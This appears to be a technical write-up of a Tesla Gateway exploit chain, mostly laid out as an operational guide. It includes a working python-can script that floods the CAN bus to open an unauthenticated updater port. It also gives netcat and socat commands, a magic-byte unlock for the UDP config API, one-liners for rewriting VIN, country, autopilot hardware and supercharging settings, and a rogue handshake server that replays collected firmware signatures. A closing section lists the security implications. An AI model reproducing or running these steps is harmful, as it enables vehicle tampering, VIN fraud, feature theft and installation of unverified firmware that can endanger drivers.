# Tesla Gateway CAN Flooding Exploit

## Overview

This document details the Gateway CAN flooding exploit that opens port 25956, enabling firmware installation without Tesla's servers. The attack exploits a vulnerability in how the Gateway ECU handles CAN bus traffic, triggering the updater service to listen on an unauthenticated network port.

---

## 1. Attack Overview

### Mechanism

The Gateway ECU monitors CAN bus traffic for diagnostic and update-related messages. By flooding the CAN bus with specific message IDs at high rates, the Gateway enters a "service mode" state that:

1. Opens TCP port **25956** on the Gateway's Ethernet interface
2. Enables a shell-like updater interface
3. Allows firmware handshake configuration without authentication

### Port 25956 Opening Trigger

The exploit requires two specific CAN messages sent simultaneously:

| CAN ID | Decimal | Purpose | Rate |
|--------|---------|---------|------|
| 0x3C2 | 962 | Diagnostic trigger | 10,000 msg/sec (0.1ms) |
| 0x622 | 1570 | UDS tester-present keepalive | ~33 msg/sec (30ms) |

When both messages are sustained, the Gateway's updater daemon opens its network listener within 10-30 seconds.

### Required Hardware

- **PCAN USB adapter** (PEAK Systems PCAN-USB)
- OBD-II to DB9 cable or direct CAN bus access
- Linux system with `python-can` library
- Ethernet connection to vehicle network (192.168.90.x)

---

## 2. CAN Message Details

### Message ID 0x3C2 (962) - Diagnostic Trigger

```
Arbitration ID: 962 (0x3C2)
Data: 49 65 00 00 00 00 00 00
Data bytes: [0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
Interval: 0.0001 seconds (0.1ms = 10,000 messages/second)
Extended ID: False
```

The bytes `0x49 0x65` appear to be a "magic value" that triggers internal service mode logic.

### Message ID 0x622 (1570) - UDS Tester Present

```
Arbitration ID: 1570 (0x622)  
Data: 02 11 01 00 00 00 00 00
Data bytes: [0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]
Interval: 0.03 seconds (30ms = ~33 messages/second)
Extended ID: False
```

This is a standard UDS (Unified Diagnostic Services) "Tester Present" message that keeps diagnostic sessions alive.

### Python-CAN Attack Script

**File:** `scripts/openportlanpluscan.py`

```python
import time
import can

can_interface = "PCAN_USBBUS1"
bus = can.interface.Bus(channel=can_interface, bustype='pcan')

messages = [
    {"id": 1570, "data": [0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00], "interval": 0.03},  # 30 ms
    {"id": 962, "data": [0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], "interval": 0.0001},  # 0.1 ms
]

try:
    print("Starting spoofing...")
    while True:
        for msg in messages:
            message = can.Message(
                arbitration_id=msg["id"],
                data=msg["data"],
                is_extended_id=False
            )
            try:
                bus.send(message)
                print(f"Send: ID={message.arbitration_id}, Data={message.data}")
            except can.CanError as e:
                print(f"Error: {e}")
            
            time.sleep(msg["interval"])
except KeyboardInterrupt:
    print("stop executing...")
```

---

## 3. Complete Attack Procedure

### Step 1: Physical Connection

1. Connect PCAN USB adapter to the vehicle's OBD-II port (or direct CAN bus access)
2. Connect Ethernet to the vehicle's diagnostic network
3. Configure your machine's IP on the 192.168.90.x subnet:
   ```bash
   sudo ip addr add 192.168.90.100/24 dev eth0
   ```

### Step 2: Install Dependencies

```bash
pip install python-can
# For PCAN on Linux:
# Install PCAN driver from PEAK Systems
```

### Step 3: Execute CAN Flooding

```bash
python3 openportlanpluscan.py
```

Let the script run for 10-30 seconds while monitoring port 25956.

### Step 4: Port Opening Detection

In a separate terminal, continuously check for the port:

```bash
# Method 1: Direct connection attempt
while ! nc -z 192.168.90.102 25956 2>/dev/null; do
    echo "Waiting for port 25956..."
    sleep 1
done
echo "Port 25956 is OPEN!"

# Method 2: nmap scan
nmap -p 25956 192.168.90.102
```

### Step 5: Access Updater Shell

Once port 25956 opens, connect via netcat:

```bash
nc 192.168.90.102 25956
```

This provides a shell-like interface with commands including:
- `help` - List available commands
- `set_handshake <host> <port>` - Configure firmware handshake server
- `install <url>` - Install firmware from URL
- `status` - Check current status

### Step 6: Configure Firmware Handshake

Within the updater shell:

```
set_handshake 192.168.90.100 8080
```

This redirects firmware signature verification to your local server instead of Tesla's servers.

---

## 4. Gateway UDPAPI (Port 3500)

The Gateway exposes a UDP API on port 3500 for configuration management. By default, changes are rejected unless the config is "unlocked."

### Config Unlock Command

Send the magic bytes to unlock configuration:

```
Hex: 18 BA BB A0 AD
```

Using socat:
```bash
echo "18babba0ad" | xxd -r -p | socat - udp:192.168.90.102:3500
```

**Expected response:** Echo of sent payload = success

### VIN Editing

Write VIN (Config ID 0x00):
```bash
# VIN is ASCII, 17 characters
VIN="5YJ3E1EA8KF123456"
VIN_HEX=$(echo -n "$VIN" | xxd -p)
echo "0c0000${VIN_HEX}" | xxd -r -p | socat - udp:192.168.90.102:3500
```

### Country Code Editing

Write Country (Config ID 0x06):
```bash
# Country codes: US, DE, NL, AE, PL, JO, UK, RU
COUNTRY="US"
COUNTRY_HEX=$(echo -n "$COUNTRY" | xxd -p)
echo "0c0006${COUNTRY_HEX}" | xxd -r -p | socat - udp:192.168.90.102:3500
```

### Map Region Configuration

Config ID 0x42 (66 decimal):
| Region | Value |
|--------|-------|
| US | 00 |
| EU | 01 |
| CN | 03 |
| JP | 05 |
| KR | 07 |

```bash
echo "0c004201" | xxd -r -p | socat - udp:192.168.90.102:3500  # Set EU
```

### AP Hardware Upgrade Commands

DAS Hardware (Config ID 0x3B / 59 decimal):
| Hardware | Value |
|----------|-------|
| PARKER_PASCAL_2_5 (HW2.5) | 03 |
| TESLA_AP3 (HW3) | 04 |

```bash
# Upgrade to AP3
echo "0c003b04" | xxd -r -p | socat - udp:192.168.90.102:3500
```

### Full UDPAPI Tool

**File:** `scripts/gw.sh`

An interactive shell for all UDPAPI operations:
```bash
chmod +x scripts/gw.sh
./scripts/gw.sh
```

Features:
- Configure target host/port
- DAS HW modification
- Headlights settings
- Map region
- Country code
- Supercharging access
- VIN modification
- Raw UDP packet sending

---

## 5. Signature Database

### How signature.json Enables Forgery

Tesla firmware packages are cryptographically signed. The Gateway normally verifies signatures against Tesla's servers during the handshake process:

1. Gateway sends `package_signature` to Tesla
2. Tesla returns `ssq_download_sig`, `ssq_download_url`, `ssq_download_file_md5`
3. Gateway verifies and downloads firmware

**The Exploit:** By running your own handshake server with a comprehensive signature database, you can:

1. Intercept the signature verification request
2. Return pre-collected valid signatures for any firmware version
3. Serve modified or older firmware files

### Signature Database Files

**`signatures.json`** - Contains ~9000 entries with:
```json
{
  "firmwareDate": "2022-08-27",
  "firmwareVersion": "2022.24.6.mcu2",
  "signature": "vuVal+WBQE3lLzadYgyaK5fOvejamPW8PqBHTQtPCkE4vLMVQg/8yvGrWbfCvzzTUoc0QK1lrDmJgSR9e/0RCQ==",
  "md5": "94d074c49617057376b0a61b8444e553",
  "secVersion": "15",
  "downloadUrl": "https://secure.lunars.dev/firmware/mcu2/2022.24.6.mcu2",
  "productRelease": "develop-2022.24.6-212-40a0d11b18",
  "apeSig": "S82RP+Cb6UDRvz1latdI4l0Ns5rBKETXoGqQKMkM4TT2wAlSmal7//6i01st0vSmiuQ0lhngj8K/DpYjgxAyCg==",
  "apeSig25": "g3B2i44mNDCoySrq1nm4yO3gNW9L5PxV7P8XDCxdogkHT4lMQO5BlUbBMs8VmyycVqT8YIO1fGwFIvXB46wBAw==",
  "apeSig3": "7x0HIRSeb623+CssO5xpl3cc5x7ZOxhC1Ftn1orGIIAkx341ypTWOkpd9KU5ViaiFcBNreeCQbNo1OD+0sVTBA=="
}
```

### Firmware Installation Without Verification

**File:** `scripts/handshake/server.js`

Run the handshake server:
```bash
cd scripts/handshake
npm install
node server.js
```

The server:
1. Listens on port 8080 (configurable via `PORT` env)
2. Serves `/packages/signature?signature=...` endpoint
3. Handles `/vehicles/:vin/handshake` POST requests
4. Serves firmware files with resume support (.ice, .mcu, .mcu1, .mcu2, .mcu25, .mcu3)

### Installation Process

1. Start handshake server with signature database
2. Open port 25956 via CAN flooding
3. Connect to updater shell: `nc 192.168.90.102 25956`
4. Set handshake: `set_handshake 192.168.90.100 8080`
5. Install: `install http://192.168.90.100:8080/2022.24.6.mcu2`

The Gateway will:
1. Request signature verification from your server
2. Your server returns matching entry from signature.json
3. Gateway accepts the firmware as legitimate
4. Installation proceeds without Tesla server contact

---

## Script Inventory

All scripts copied to `/root/tesla/scripts/`:

| File | Purpose |
|------|---------|
| `openportlanpluscan.py` | CAN flooding to open port 25956 |
| `gw.sh` | Interactive UDPAPI config editor |
| `get_signture.sh` | Extract signatures from firmware images |
| `firmware_server.js` | Simple firmware/handshake server |
| `handshake/server.js` | Full handshake server with resume support |
| `signatures.json` | Firmware signature database (262KB) |
| `handshake/signature.json` | Additional signature entries (437KB) |
| `package.json` | Node.js dependencies |

---

## Network Topology

```
[Attacker PC]
├── eth0: 192.168.90.100/24 ──── [Vehicle Ethernet]
│                                      │
└── PCAN USB ─────────────────── [Vehicle CAN Bus]
                                       │
                            ┌──────────┴──────────┐
                            │                     │
                      [Gateway ECU]         [Other ECUs]
                      192.168.90.102
                      ├── Port 3500 (UDPAPI)
                      └── Port 25956 (Updater - when triggered)
```

---

## Security Implications

This exploit chain demonstrates:

1. **No CAN authentication** - Messages are accepted without cryptographic verification
2. **Magic byte triggers** - Specific byte patterns unlock service modes  
3. **Network service exposure** - Unauthenticated network ports can be triggered
4. **Signature replay** - Pre-collected signatures bypass verification
5. **Config mutability** - VIN, country, features can be modified via UDP

Tesla has partially mitigated this in newer firmware by:
- Requiring additional authentication for port 25956
- Rate limiting CAN message processing
- Adding signature freshness checks

However, the UDPAPI (port 3500) unlock mechanism (`18 BA BB A0 AD`) remains functional on many Gateway versions.
